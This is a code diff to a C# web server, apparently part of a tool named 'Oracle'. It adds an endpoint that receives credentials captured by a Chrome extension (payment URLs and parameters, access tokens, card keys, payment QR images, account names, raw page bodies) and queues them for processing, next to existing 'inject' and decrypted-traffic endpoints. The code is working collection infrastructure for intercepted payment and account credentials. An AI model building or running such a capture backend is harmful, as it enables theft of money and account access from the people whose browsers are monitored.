@@ -229,6 +229,69 @@ app.MapPost("/inject", (Credential cred) =>
     return Results.Ok(new { status = "queued", id = cred.Id });
 });
 
+// ── Chrome Extension capture endpoint ──────────────────────
+// Accepts credentials captured by the Chrome Extension (postMessage, DOM, etc.)
+// Parses them into Oracle's Credential model and queues for processing.
+app.MapPost("/api/capture/ingest", async (HttpRequest req) =>
+{
+    try
+    {
+        var body = await req.ReadFromJsonAsync<Dictionary<string, object>>();
+        if (body == null)
+            return Results.BadRequest(new { error = "invalid_json" });
+
+        var cred = new Credential
+        {
+            Type = ParseCredentialTypeExt(body.GetValueOrDefault("type", "")?.ToString() ?? ""),
+            Value = body.GetValueOrDefault("value", "")?.ToString() ?? "",
+            Platform = body.GetValueOrDefault("platform", "")?.ToString() ?? "unknown",
+            ProductId = body.GetValueOrDefault("product_id", "")?.ToString() ?? "",
+            Source = body.GetValueOrDefault("source", "extension")?.ToString() ?? "extension",
+            OpenId = body.GetValueOrDefault("openid", "")?.ToString() ?? "",
+            PayMethod = body.GetValueOrDefault("pay_method", "")?.ToString() ?? "",
+            AccountName = body.GetValueOrDefault("account_name", "")?.ToString() ?? "",
+            CapturedAt = DateTime.UtcNow,
+            Metadata = new Dictionary<string, string>(),
+        };
+
+        // Copy extra fields into metadata
+        foreach (var (k, v) in body)
+        {
+            if (k is "type" or "value" or "platform" or "product_id" or "source"
+                or "openid" or "pay_method" or "account_name" or "captured_at" or "body")
+                continue;
+            cred.Metadata[k] = v?.ToString() ?? "";
+        }
+
+        // Preserve full request body if present
+        if (body.TryGetValue("body", out var reqBody) && reqBody != null)
+            cred.Metadata["request_body"] = reqBody.ToString() ?? "";
+
+        // If extension sent raw page body (for JS-generated QR codes), capture it
+        if (body.TryGetValue("page_body", out var pageBody) && pageBody != null)
+            cred.Metadata["page_body"] = pageBody.ToString() ?? "";
+
+        await credQueue.EnqueueAsync(cred);
+        return Results.Ok(new { status = "queued", id = cred.Id });
+    }
+    catch (Exception ex)
+    {
+        return Results.Problem(ex.Message);
+    }
+});
+
+// Helper for extension credential types
+static CredentialType ParseCredentialTypeExt(string type) => type.ToLower() switch
+{
+    "payment_url" => CredentialType.PaymentUrl,
+    "payment_params" or "payment_params_raw" => CredentialType.PaymentParams,
+    "access_token" => CredentialType.AccessToken,
+    "qr_image" => CredentialType.QrImage,
+    "card_key" => CredentialType.CardKey,
+    "iframe_url" => CredentialType.RawData,
+    _ => CredentialType.RawData
+};
+
 // Recent captured data (for Dashboard)
 // Traffic inspector (decrypted HTTP traffic)
 app.MapGet("/traffic", () =>
